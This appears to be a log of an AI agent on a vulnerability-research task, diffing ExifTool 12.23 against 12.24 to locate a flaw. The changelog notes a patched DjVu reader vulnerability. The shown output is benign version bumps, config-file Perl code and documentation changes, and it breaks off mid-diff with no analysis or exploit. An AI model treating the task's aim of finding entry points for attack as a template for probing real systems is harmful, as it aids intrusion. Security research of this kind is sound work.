================================================================================
Starting Code Analyst execution
Input: Task: Provide a comprehensive diff of the codebase in the sandbox to identify vulnerable versions and changes that may introduce security issues.

Instructions:
1) Check shared memory first for any prior repo or diff context; avoid duplicating work. If none, proceed to scan the workspace.
2) Enumerate all versions/releases/folders/tags. Treat a version as vulnerable if:
   - The path/name includes “-vuln” or “-vulnerable”, OR
   - It’s the lowest semantic version number among versions, OR
   - It is explicitly labeled as vulnerable in metadata/README/CHANGELOG.
3) Identify the latest non-vulnerable version to compare against. If only one version exists, still extract security-relevant hotspots.
4) Produce:
   - A high-level version map and which one is vulnerable.
   - A git-style diff (or pseudo-diff) of vulnerable vs. fixed versions: added/removed/modified files, with line-level changes where possible.
   - Highlight changes touching: input parsing, auth/session, crypto, deserialization, command/file exec, path handling, memory/buffer ops, boundary checks, sandbox escapes, network handlers, web routes, IPC, privilege changes, and error handling.
   - Note any new dependencies or config defaults that alter security posture.
5) Identify likely vulnerable entry points and attack surfaces exposed by the vulnerable version (CLIs, network ports, HTTP endpoints, file parsers, IPC, env vars, etc.). Provide runnable commands or URLs for testing in the sandbox.
6) Store concise artifacts in shared memory with distinct keys (e.g., diff_summary, versions_map, vulnerable_entrypoints) without overwriting existing keys. If you need repo path, build steps, or runtime details, explicitly request them.

If you encounter missing information (e.g., project path), stop and request it immediately so we can unblock you.
================================================================================

[1]============================Tool Call (Code Analyst)============================
list_shared_memory()

[1]===========================Tool Output (Code Analyst)===========================
Shared memory is empty

[2]============================Tool Call (Code Analyst)============================
codebrowser_get_diff(file1='exiftool-12.23', file2='exiftool-12.24', options=['-u'])

[2]===========================Tool Output (Code Analyst)===========================
Diff between exiftool-12.23 and exiftool-12.24:

<diff>
diff -u exiftool-12.23/Changes exiftool-12.24/Changes
--- exiftool-12.23/Changes	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/Changes	2021-04-13 15:11:46.000000000 +0000
@@ -7,6 +7,17 @@
 Note: The most recent production release is Version 12.16. (Other versions are
 considered development releases, and are not uploaded to MetaCPAN.)
 
+Apr. 13, 2021 - Version 12.24
+
+  - Added a new PhaseOne RawFormat value (thanks LibRaw)
+  - Decode a new Sony tag (thanks Jos Roost)
+  - Decode a few new Panasonic and FujiFilm tags (thanks LibRaw and Greybeard)
+  - Patched security vulnerability in DjVu reader
+  - Updated acdsee.config in distribution (thanks StarGeek)
+  - Recognize AutoCAD DXF files
+  - More work on experimental JUMBF read support
+  - More work on experimental JXL read/write support
+
 Apr. 1, 2021 - Version 12.23
 
   - Added support for Olympus ORI files

diff -u exiftool-12.23/META.json exiftool-12.24/META.json
--- exiftool-12.23/META.json	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/META.json	2021-04-13 15:11:46.000000000 +0000
@@ -47,6 +47,6 @@
       }
    },
    "release_status" : "stable",
-   "version" : "12.23",
+   "version" : "12.24",
    "x_serialization_backend" : "JSON::PP version 4.02"
 }

diff -u exiftool-12.23/META.yml exiftool-12.24/META.yml
--- exiftool-12.23/META.yml	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/META.yml	2021-04-13 15:11:46.000000000 +0000
@@ -28,5 +28,5 @@
   Time::HiRes: 0
 requires:
   perl: 5.004
-version: 12.23
+version: 12.24
 x_serialization_backend: 'JSON::PP version 4.02'

diff -u exiftool-12.23/README exiftool-12.24/README
--- exiftool-12.23/README	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/README	2021-04-13 15:11:46.000000000 +0000
@@ -106,8 +106,8 @@
 terminal window to extract and run ExifTool:
 
   cd ~/Desktop
-  gzip -dc Image-ExifTool-12.23.tar.gz | tar -xf -
-  cd Image-ExifTool-12.23
+  gzip -dc Image-ExifTool-12.24.tar.gz | tar -xf -
+  cd Image-ExifTool-12.24
   ./exiftool t/images/ExifTool.jpg
 
 Note:  These commands extract meta information from one of the test images.

Common subdirectories: exiftool-12.23/arg_files and exiftool-12.24/arg_files

Common subdirectories: exiftool-12.23/config_files and exiftool-12.24/config_files

diff -u exiftool-12.23/exiftool exiftool-12.24/exiftool
--- exiftool-12.23/exiftool	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/exiftool	2021-04-13 15:11:46.000000000 +0000
@@ -10,7 +10,7 @@
 use strict;
 require 5.004;
 
-my $version = '12.23';
+my $version = '12.24';
 
 # add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
 my $exeDir;
@@ -5393,7 +5393,7 @@
 
 produces output like this:
 
-    -- Generated by ExifTool 12.23 --
+    -- Generated by ExifTool 12.24 --
     File: a.jpg - 2003:10:31 15:44:19
     (f/5.6, 1/60s, ISO 100)
     File: b.jpg - 2006:05:23 11:57:38

Common subdirectories: exiftool-12.23/fmt_files and exiftool-12.24/fmt_files

Common subdirectories: exiftool-12.23/html and exiftool-12.24/html

Common subdirectories: exiftool-12.23/lib and exiftool-12.24/lib

diff -u exiftool-12.23/perl-Image-ExifTool.spec exiftool-12.24/perl-Image-ExifTool.spec
--- exiftool-12.23/perl-Image-ExifTool.spec	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/perl-Image-ExifTool.spec	2021-04-13 15:11:46.000000000 +0000
@@ -1,6 +1,6 @@
 Summary: perl module for image data extraction
 Name: perl-Image-ExifTool
-Version: 12.23
+Version: 12.24
 Release: 1
 License: Artistic/GPL
 Group: Development/Libraries/Perl

Common subdirectories: exiftool-12.23/t and exiftool-12.24/t

diff -u exiftool-12.23/windows_exiftool exiftool-12.24/windows_exiftool
--- exiftool-12.23/windows_exiftool	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/windows_exiftool	2021-04-13 15:11:46.000000000 +0000
@@ -10,7 +10,7 @@
 use strict;
 require 5.004;
 
-my $version = '12.23';
+my $version = '12.24';
 
 # add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
 my $exeDir;
@@ -5417,7 +5417,7 @@
 
          produces output like this:
 
-             -- Generated by ExifTool 12.23 --
+             -- Generated by ExifTool 12.24 --
              File: a.jpg - 2003:10:31 15:44:19
              (f/5.6, 1/60s, ISO 100)
              File: b.jpg - 2006:05:23 11:57:38
</diff>

[3]============================Tool Call (Code Analyst)============================
codebrowser_get_diff(file1='exiftool-12.23', file2='exiftool-12.24', options=['-u', '-r', '-N'])

[3]===========================Tool Output (Code Analyst)===========================
Diff between exiftool-12.23 and exiftool-12.24:

<diff>
diff -u -r -N exiftool-12.23/Changes exiftool-12.24/Changes
--- exiftool-12.23/Changes	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/Changes	2021-04-13 15:11:46.000000000 +0000
@@ -7,6 +7,17 @@
 Note: The most recent production release is Version 12.16. (Other versions are
 considered development releases, and are not uploaded to MetaCPAN.)
 
+Apr. 13, 2021 - Version 12.24
+
+  - Added a new PhaseOne RawFormat value (thanks LibRaw)
+  - Decode a new Sony tag (thanks Jos Roost)
+  - Decode a few new Panasonic and FujiFilm tags (thanks LibRaw and Greybeard)
+  - Patched security vulnerability in DjVu reader
+  - Updated acdsee.config in distribution (thanks StarGeek)
+  - Recognize AutoCAD DXF files
+  - More work on experimental JUMBF read support
+  - More work on experimental JXL read/write support
+
 Apr. 1, 2021 - Version 12.23
 
   - Added support for Olympus ORI files

diff -u -r -N exiftool-12.23/META.json exiftool-12.24/META.json
--- exiftool-12.23/META.json	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/META.json	2021-04-13 15:11:46.000000000 +0000
@@ -47,6 +47,6 @@
       }
    },
    "release_status" : "stable",
-   "version" : "12.23",
+   "version" : "12.24",
    "x_serialization_backend" : "JSON::PP version 4.02"
 }

diff -u -r -N exiftool-12.23/META.yml exiftool-12.24/META.yml
--- exiftool-12.23/META.yml	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/META.yml	2021-04-13 15:11:46.000000000 +0000
@@ -28,5 +28,5 @@
   Time::HiRes: 0
 requires:
   perl: 5.004
-version: 12.23
+version: 12.24
 x_serialization_backend: 'JSON::PP version 4.02'

diff -u -r -N exiftool-12.23/README exiftool-12.24/README
--- exiftool-12.23/README	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/README	2021-04-13 15:11:46.000000000 +0000
@@ -106,8 +106,8 @@
 terminal window to extract and run ExifTool:
 
   cd ~/Desktop
-  gzip -dc Image-ExifTool-12.23.tar.gz | tar -xf -
-  cd Image-ExifTool-12.23
+  gzip -dc Image-ExifTool-12.24.tar.gz | tar -xf -
+  cd Image-ExifTool-12.24
   ./exiftool t/images/ExifTool.jpg
 
 Note:  These commands extract meta information from one of the test images.

diff -u -r -N exiftool-12.23/config_files/acdsee.config exiftool-12.24/config_files/acdsee.config
--- exiftool-12.23/config_files/acdsee.config	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/config_files/acdsee.config	2021-04-13 15:11:46.000000000 +0000
@@ -2,20 +2,76 @@
 # File:         acdsee.config
 #
 # Description:  This config file defines ACDSee XMP region tags for writing.
+#               The following tags are created in the XMP-acdsee-rs group
 #
-# Usage:        exiftool -config acdsee.config -ACDSEETAG=VALUE FILE ...
+#                   RegionInfoACDSee : The structured tag for the ACDSee regions
+#                                      (similar to XMP-mwg-rs:RegionInfo)
+#
+#                   The following tags are the width, height, and unit of the
+#                   image at the time of processing  when storing image region
+#                   metadata.  They are similar to the AppliedToDimensions tags
+#                   of the MWG regions.
+#                       ACDSeeRegionAppliedToDimensionsH : Height of the image
+#                       ACDSeeRegionAppliedToDimensionsUnit : Unit of the image
+#                       ACDSeeRegionAppliedToDimensionsW : Width of the image
+#
+#                   Actual region data, stored in an array.  These flattened tags
+#                   are treated as List Type tags.  There are two region types,
+#                   the ALYArea and the DLYArea.  The ALYArea tags tags assigned
+#                   by ACDSee and are usually square in dimensions.  The DLYArea
+#                   tags are both the tags assigned by ACDSee (but possibly
+#                   rectangular instead of square) as well as any  manual
+#                   assigned tags.  They are similar to the area tags of the MWG
+#                   regions.
+#                       ACDSeeRegionDLYAreaH : Height of DLY region
+#                       ACDSeeRegionDLYAreaW : Width of DLY region
+#                       ACDSeeRegionDLYAreaX : X centerpoint of DLY region
+#                       ACDSeeRegionDLYAreaY : Y centerpoint of DLY region
+#                       ACDSeeRegionALYAreaH : Height of ALY region
+#                       ACDSeeRegionALYAreaW : Width of ALY region
+#                       ACDSeeRegionALYAreaX : X centerpoint of ALY region
+#                       ACDSeeRegionALYAreaY : Y centerpoint of ALY region
+#                       ACDSeeRegionName : Name of region
+#                       ACDSeeRegionType : Type of region
+#                       ACDSeeRegionNameAssignType : How the type was assigned.
+#                                                    "Manual" is the only known
+#                                                    entry at this time
+#
+#               Conversion tags.  These tags can be used to convert other region
+#               type tags to ACDSee regions.
+#                   MPRegion2ACDSeeRegion : Converts a Microsoft RegionInfoMP
+#                   IPTCRegion2ACDSeeRegion : Converts an IPTC ImageRegion
+#                   MWGRegion2ACDSeeRegion : Converts a MWG RegionInfo
+#
+# Usage:        To set individual tags
+#               exiftool -config acdsee.config -ACDSEETAG=VALUE FILE ...
+#
+#               To convert Microsoft Regions to ACDSee regions
+#               exiftool -config acdsee.config "-RegionInfoACDSee<MPRegion2ACDSeeRegion" File ...
+#               To convert IPTC regions to ACDSee regions
+#               exiftool -config acdsee.config "-RegionInfoACDSee<IPTCRegion2ACDSeeRegion" File ...
+#               To convert MWG Regions to ACDSee regions
+#               exiftool -config acdsee.config "-RegionInfoACDSee<MWGRegion2ACDSeeRegion" File ...
 #
 # Requires:     ExifTool version 10.28 or later
 #
 # Revisions:    2020/01/28 - Bryan K. Williams (aka StarGeek) Created
+#               2021/04/08 - BKW Added tags to convert from Microsoft, IPTC,
+#                            and MWG regions to ACDSee regions based upon
+#                            convert_regions.config.  Expanded docs.
+#                            Shortened ADCSee tag names and added shortcuts
+#                            from original names to new names, for example
+#                            "RegionInfoACDSeeAppliedToDimensions*" -> "ACDSeeRegionAppliedToDimensions*"
+#                            "RegionInfoACDSeeRegionList* -> "ACDSeeRegion*"
 #------------------------------------------------------------------------------
+use Data::Dumper;
 
 my %sACDSeeDimensions = (
     STRUCT_NAME => 'ACDSee Dimensions',
     NAMESPACE   => {'acdsee-stDim' => 'http://ns.acdsee.com/sType/Dimensions#'},
-    'w'           => { Writable => 'real' },
-    'h'           => { Writable => 'real' },
-    'unit'        => { },
+    'w'         => { Writable => 'real' },
+    'h'         => { Writable => 'real' },
+    'unit'      => { },
 );
 
 my %sACDSeeArea = (
@@ -38,7 +94,7 @@
 );
 
 %Image::ExifTool::UserDefined = (
-    # new XMP namespaces (eg. xxx) must be added to the Main XMP table:
+    # new XMP namespaces for ACDSee regions
     'Image::ExifTool::XMP::Main' => {
         'acdsee-rs' => { # <-- must be the same as the NAMESPACE prefix
             SubDirectory => { 
@@ -46,6 +102,112 @@
             },
         },
     },
+    'Image::ExifTool::Composite' => {
+    # create an ACDSee RegionInfo structure from a Microsoft RegionInfoMP structure
+        MPRegion2ACDSeeRegion => {
+            Require => {
+                0 => 'RegionInfoMP',
+                1 => 'ImageWidth',
+                2 => 'ImageHeight',
+            },
+            ValueConv => q{
+                my ($rgn, @newRgns);
+                foreach $rgn (@{$val[0]{Regions}}) {
+                    my $name = $$rgn{PersonDisplayName};
+                    next unless $$rgn{Rectangle} or defined $name;
+                    my %newRgn = ( Type => 'Face' );
+                    if (defined $name) {
+                        # don't add ignored faces
+                        next if $name eq 'ffffffffffffffff';
+                        $newRgn{Name} = $name;
+                    }
+                    if ($$rgn{Rectangle}) {
+                        my @rect = split /\s*,\s*/, $$rgn{Rectangle};
+                        $newRgn{DLYArea} = {
+                            X => $rect[0] + $rect[2]/2,
+                            Y => $rect[1] + $rect[3]/2,
+                            W => $rect[2],
+                            H => $rect[3],
+                        } if @rect == 4;
+                    }
+                    push @newRgns, \%newRgn;
+                }
+                return {
+                    AppliedToDimensions => { W => $val[1], H => $val[2], Unit => 'pixel' },
+                    RegionList => \@newRgns,
+                };
+            },
+        },
+        # create an ACDSee RegionInfo structure from an IPTC ImageRegion list
+        IPTCRegion2ACDSeeRegion => {
+            Require => {
+                0 => 'ImageRegion',
+                1 => 'ImageWidth',
+                2 => 'ImageHeight',
+            },
+            ValueConv => q{
+                my ($rgn, @newRgns);
+                my $rgns = ref $val[0] eq 'ARRAY' ? $val[0] : [ $val[0] ]; 
+                foreach $rgn (@$rgns) {
+                    my %newRgn = ( Type => 'Face' );
+                    if ($$rgn{RegionBoundary} and $$rgn{RegionBoundary}{RbShape} eq 'rectangle') {
+                        my @rect = @{$$rgn{RegionBoundary}}{'RbX','RbY','RbW','RbH'};
+                        if ($$rgn{RegionBoundary}{RbUnit} eq 'pixel') {
+                            $rect[0] /= $val[1],  $rect[2] /= $val[1];
+                            $rect[1] /= $val[2];  $rect[3] /= $val[2];
+                        }
+                        $newRgn{'DLYArea'} = {
+                            X => $rect[0] + $rect[2]/2,
+                            Y => $rect[1] + $rect[3]/2,
+                            W => $rect[2],
+                            H => $rect[3],
+                        };
+                    } else {
+                        next unless defined $$rgn{Name};
+                    }
+                    $newRgn{Name} = $$rgn{Name} if defined $$rgn{Name};
+                    push @newRgns, \%newRgn;
+                }
+                return {
+                    AppliedToDimensions => { 'W' => $val[1], 'H' => $val[2], 'Unit' => 'pixel' },
+                    RegionList => \@newRgns,
+                };
+            },
+        },
+
+        # create an MWG RegionInfo structure from an IPTC ImageRegion list
+        MWGRegion2ACDSeeRegion => {
+            Require => {
+                0 => 'RegionInfo',
+                1 => 'ImageWidth',
+                2 => 'ImageHeight',
+            },
+            ValueConv => q{
+                my ($rgn, @newRgns);
+                my %newRgn;
+                foreach $rgn (@{$val[0]{RegionList}}) {
+                    next unless $$rgn{Area} or defined $$rgn{Name};
+                    my %newRgn;
+                    if ($$rgn{Area}) {
+                        $newRgn{'DLYArea'} = {
+                            'X' => $$rgn{Area}{'X'},
+                            'Y' => $$rgn{Area}{'Y'},
+                            'W' => $$rgn{Area}{'W'},
+                            'H' => $$rgn{Area}{'H'},
+                        };
+                    };
+                    $newRgn{Name} = $$rgn{Name} if defined $$rgn{Name};
+                    $newRgn{'Type'} = $$rgn{'Type'} if defined $$rgn{'Type'};
+                    push @newRgns, \%newRgn;
+                }
+                return {
+                    'AppliedToDimensions' => $val[0]{'AppliedToDimensions'},
+                    RegionList => \@newRgns,
+                }
+            },
+        },
+        ####
+    },
 );
 
 %Image::ExifTool::UserDefined::ACDSeeRegions = (
@@ -54,18 +216,43 @@
     WRITABLE => 'string', # (default to string-type tags)
     Regions => {
         Name => 'RegionInfoACDSee',
+        FlatName => 'ACDSee',
         # the "Struct" entry defines the structure fields
         Struct => {
             # optional structure name (used for warning messages only)
             STRUCT_NAME => 'ACDSee RegionInfo',        
             RegionList => {
+                FlatName => 'Region',
                 Struct => \%sACDSeeRegionStruct,
                 List => 'Bag',
             },
-            AppliedToDimensions => { Struct => \%sACDSeeDimensions },
+            AppliedToDimensions => { 
+            FlatName => 'RegionAppliedToDimensions',Struct => \%sACDSeeDimensions },
         },
     },
 );
 
+# Shortcuts to old names added so as not to break previously used commands
+%Image::ExifTool::UserDefined::Shortcuts = (
+    RegionInfoACDSeeAppliedToDimensionsH        => 'ACDSeeRegionAppliedToDimensionsH',
+    RegionInfoACDSeeAppliedToDimensionsUnit     => 'ACDSeeRegionAppliedToDimensionsUnit',
+    RegionInfoACDSeeAppliedToDimensionsW        => 'ACDSeeRegionAppliedToDimensionsW',
+    RegionInfoACDSeeRegionListDLYAreaH          => 'ACDSeeRegionDLYAreaH',
+    RegionInfoACDSeeRegionListDLYAreaW          => 'ACDSeeRegionDLYAreaW',
+    RegionInfoACDSeeRegionListDLYAreaX          => 'ACDSeeRegionDLYAreaX',  
+    RegionInfoACDSeeRegionListDLYAreaY          => 'ACDSeeRegionDLYAreaY',
+    RegionInfoACDSeeRegionListALGAreaH          => 'ACDSeeRegionALGAreaH',
+    RegionInfoACDSeeRegionListALGAreaW          => 'ACDSeeRegionALGAreaW',
+    RegionInfoACDSeeRegionListALGAreaX          => 'ACDSeeRegionALGAreaX',
+    RegionInfoACDSeeRegionListALGAreaY          => 'ACDSeeRegionALGAreaY',
+    RegionInfoACDSeeRegionListName              => 'ACDSeeRegionName',
+    RegionInfoACDSeeRegionListType              => 'ACDSeeRegionType',
+    RegionInfoACDSeeRegionListNameAssignType    => 'ACDSeeRegionNameAssignType',
+);
+
+# Forced -struct option during debugging
+#%Image::ExifTool::UserDefined::Options = (
+#   Struct => 1,
+#);
 #------------------------------------------------------------------------------
 1;  #end
\ No newline at end of file

diff -u -r -N exiftool-12.23/exiftool exiftool-12.24/exiftool
--- exiftool-12.23/exiftool	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/exiftool	2021-04-13 15:11:46.000000000 +0000
@@ -10,7 +10,7 @@
 use strict;
 require 5.004;
 
-my $version = '12.23';
+my $version = '12.24';
 
 # add our 'lib' directory to the include list BEFORE 'use Image::ExifTool'
 my $exeDir;
@@ -5393,7 +5393,7 @@
 
 produces output like this:
 
-    -- Generated by ExifTool 12.23 --
+    -- Generated by ExifTool 12.24 --
     File: a.jpg - 2003:10:31 15:44:19
     (f/5.6, 1/60s, ISO 100)
     File: b.jpg - 2006:05:23 11:57:38

diff -u -r -N exiftool-12.23/html/ExifTool.html exiftool-12.24/html/ExifTool.html
--- exiftool-12.23/html/ExifTool.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/ExifTool.html	2021-04-13 15:11:46.000000000 +0000
@@ -429,7 +429,7 @@
     specifically requested by name.</td>
     <td align=center>0 or 1</td><td align=center>undef</td></tr>
 <tr id="BlockExtract"><td>BlockExtract</td><td>Flag to extract some directories
-    (mentioned in the Tag Name documentation) as a block.</td>
+    (mentioned in the <a href="TagNames/index.html">Tag Name documentation</a>) as a block.</td>
     <td align=center><table class=clear>
     <tr><td valign=top align=right><b>0</b>&nbsp;=</td><td>Extract as block only if tag specified by name</td></tr>
     <tr><td valign=top align=right><b>1</b>&nbsp;=</td><td>Extract as block, and extract contained tags</td></tr>
@@ -787,7 +787,7 @@
     This causes some tags to be generated which normally would not be unless specifically
     requested (by passing the tag name to <a href="#ImageInfo">ImageInfo</a> or
     <a href="#ExtractInfo">ExtractInfo</a>).  May be set to 2 or 3 to enable generation
-    of some additional tags as mentioned in the tag name documentation.</td>
+    of some additional tags as mentioned in the <a href="TagNames/index.html">Tag Name documentation</a>.</td>
     <td align=center>0, 1, 2 or 3</td><td align=center>undef</td></tr>
 <tr id="RequestTags"><td>RequestTags</td><td>List of additional tag and/or group names
     to request in the next call to <a href="#ExtractInfo">ExtractInfo</a>. This option is

diff -u -r -N exiftool-12.23/html/ExifTool.pdf exiftool-12.24/html/ExifTool.pdf
--- exiftool-12.23/html/ExifTool.pdf	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/ExifTool.pdf	2021-04-13 15:11:46.000000000 +0000
@@ -12,7 +12,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     1)Tj
+(                           -- Image::ExifTool 12.24 --                                     1)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (EXIFTOOL\(1\)           User Contributed Perl Documentation          EXIFTOOL\(1\))Tj
@@ -189,7 +189,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     2)Tj
+(                           -- Image::ExifTool 12.24 --                                     2)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (         ARW   r/w   | EXV   r/w/c | M2TS  r     | PBM   r/w   | SRW   r/w)Tj
@@ -384,7 +384,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     3)Tj
+(                           -- Image::ExifTool 12.24 --                                     3)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (       be exported with the ":Public" export list.)Tj
@@ -619,7 +619,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     4)Tj
+(                           -- Image::ExifTool 12.24 --                                     4)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (               Advantages of using the object-oriented form are that options)Tj
@@ -770,7 +770,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     5)Tj
+(                           -- Image::ExifTool 12.24 --                                     5)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (               "Sort" settings the entries may not be in the same order as)Tj
@@ -955,7 +955,7 @@
 endobj
 21 0 obj
 <<
-/Length 3832
+/Length 3828
 >>
 stream
 BT
@@ -965,7 +965,7 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     6)Tj
+(                           -- Image::ExifTool 12.24 --                                     6)Tj
 /TT4 1 Tf
 0 -1.6333 TD
 (           As well as tags representing information extracted from the image,)Tj
@@ -1080,13 +1080,13 @@
 0 -2.2 TD
 (           BlockExtract)Tj
 0 -1.1 TD
-(               Flag to extract some directories \(mentioned in the Tag Name)Tj
+(               Flag to extract some directories \(mentioned in the ExifTool tag)Tj
 T*
-(               documentation\) as a block.  Setting this to a value of 2 also)Tj
+(               name documentation\) as a block.  Setting this to a value of 2)Tj
 T*
-(               prevents parsing the block to extract tags contained within.)Tj
-0 -2.2 TD
-(           ByteOrder)Tj
+(               also prevents parsing the block to extract tags contained)Tj
+T*
+(               within.)Tj
 ET
 endstream
 endobj
@@ -1104,7 +1104,7 @@
 endobj
 24 0 obj
 <<
-/Length 4804
+/Length 4742
 >>
 stream
 BT
@@ -1114,11 +1114,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     7)Tj
+(                           -- Image::ExifTool 12.24 --                                     7)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               The byte order for newly created EXIF segments when writing.)Tj
+(           ByteOrder)Tj
 0 -1.1 TD
+(               The byte order for newly created EXIF segments when writing.)Tj
+T*
 (               Note that if EXIF information already exists, the existing)Tj
 T*
 (               order is maintained.  Valid values are 'MM', 'II' and undef.)Tj
@@ -1238,8 +1240,6 @@
 (               information contains no CodedCharacterSet tag.  Possible values)Tj
 T*
 (               are the same as the "Charset" option.  Default is 'Latin'.)Tj
-0 -2.2 TD
-(               Note that this option affects some types of information when)Tj
 ET
 endstream
 endobj
@@ -1257,7 +1257,7 @@
 endobj
 27 0 obj
 <<
-/Length 4420
+/Length 4413
 >>
 stream
 BT
@@ -1267,11 +1267,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     8)Tj
+(                           -- Image::ExifTool 12.24 --                                     8)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               reading/writing the file and other types when getting/setting)Tj
+(               Note that this option affects some types of information when)Tj
 0 -1.1 TD
+(               reading/writing the file and other types when getting/setting)Tj
+T*
 (               tag values, so it must be defined for both types of access.)Tj
 0 -2.2 TD
 (           CharsetPhotoshop)Tj
@@ -1385,8 +1387,6 @@
 (               "SetNewValuesFromFile".)Tj
 0 -2.2 TD
 (           DateFormat)Tj
-0 -1.1 TD
-(               Format for printing date/time values.  See "strftime" in the)Tj
 ET
 endstream
 endobj
@@ -1404,7 +1404,7 @@
 endobj
 30 0 obj
 <<
-/Length 4972
+/Length 4970
 >>
 stream
 BT
@@ -1414,11 +1414,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                     9)Tj
+(                           -- Image::ExifTool 12.24 --                                     9)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               POSIX package for details about the format string.  If date can)Tj
+(               Format for printing date/time values.  See "strftime" in the)Tj
 0 -1.1 TD
+(               POSIX package for details about the format string.  If date can)Tj
+T*
 (               not be converted, value is left unchanged unless the StrictDate)Tj
 T*
 (               option is set.  Timezones are ignored.  The inverse conversion)Tj
@@ -1540,8 +1542,6 @@
 (               always writes it before because some utilities will ignore it)Tj
 T*
 (               otherwise.\)  When set to 3 or higher, only pseudo system tags)Tj
-T*
-(               and FileType are generated.  For 3, the file header is read to)Tj
 ET
 endstream
 endobj
@@ -1559,7 +1559,7 @@
 endobj
 33 0 obj
 <<
-/Length 4475
+/Length 4500
 >>
 stream
 BT
@@ -1569,11 +1569,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    10)Tj
+(                           -- Image::ExifTool 12.24 --                                    10)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               provide an educated guess at FileType.  For 4, the file is not)Tj
+(               and FileType are generated.  For 3, the file header is read to)Tj
 0 -1.1 TD
+(               provide an educated guess at FileType.  For 4, the file is not)Tj
+T*
 (               read at all and FileType is determined based on the file's)Tj
 T*
 (               extension.  For 5, generation of Composite tags is also)Tj
@@ -1689,8 +1691,6 @@
 (           GeoSpeedRef)Tj
 0 -1.1 TD
 (               Reference units for writing GPSSpeed when geotagging:)Tj
-0 -2.2 TD
-(                   'K', 'k' or 'km/h'  - km/h)Tj
 ET
 endstream
 endobj
@@ -1708,7 +1708,7 @@
 endobj
 36 0 obj
 <<
-/Length 4726
+/Length 4721
 >>
 stream
 BT
@@ -1718,11 +1718,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    11)Tj
+(                           -- Image::ExifTool 12.24 --                                    11)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(                   'M', 'm' or 'mph'   - mph)Tj
+(                   'K', 'k' or 'km/h'  - km/h)Tj
 0 -1.1 TD
+(                   'M', 'm' or 'mph'   - mph)Tj
+T*
 (                   <anything else>     - knots \(default undef\))Tj
 0 -2.2 TD
 (           GlobalTimeShift)Tj
@@ -1882,8 +1884,6 @@
 (               type tags into a single string.  If not defined, multi-item)Tj
 T*
 (               lists are returned as a list reference.  Does not affect)Tj
-T*
-(               ValueConv values.  Default is ', '.)Tj
 ET
 endstream
 endobj
@@ -1901,7 +1901,7 @@
 endobj
 41 0 obj
 <<
-/Length 4332
+/Length 4308
 >>
 stream
 BT
@@ -1911,9 +1911,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    12)Tj
+(                           -- Image::ExifTool 12.24 --                                    12)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(               ValueConv values.  Default is ', '.)Tj
+0 -2.2 TD
 (           ListSplit)Tj
 0 -1.1 TD
 (               Regular expression used to split values of list-type tags into)Tj
@@ -2027,8 +2029,6 @@
 (               QuickTime specification.)Tj
 0 -2.2 TD
 (           RequestAll)Tj
-0 -1.1 TD
-(               Flag to request all tags to be extracted.  This causes some)Tj
 ET
 endstream
 endobj
@@ -2046,7 +2046,7 @@
 endobj
 44 0 obj
 <<
-/Length 4470
+/Length 4459
 >>
 stream
 BT
@@ -2056,11 +2056,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    13)Tj
+(                           -- Image::ExifTool 12.24 --                                    13)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               tags to be generated which normally would not be unless)Tj
+(               Flag to request all tags to be extracted.  This causes some)Tj
 0 -1.1 TD
+(               tags to be generated which normally would not be unless)Tj
+T*
 (               specifically requested \(by passing the tag name to "ImageInfo")Tj
 T*
 (               or "ExtractInfo"\).  May be set to 2 or 3 to enable generation)Tj
@@ -2172,8 +2174,6 @@
 (               successfully convert the value.)Tj
 0 -2.2 TD
 (               For PNG CreationTime, a setting of 1 has the additional effect)Tj
-0 -1.1 TD
-(               of causing the date/time to be reformatted according to PNG 1.2)Tj
 ET
 endstream
 endobj
@@ -2191,7 +2191,7 @@
 endobj
 47 0 obj
 <<
-/Length 4239
+/Length 4325
 >>
 stream
 BT
@@ -2201,11 +2201,13 @@
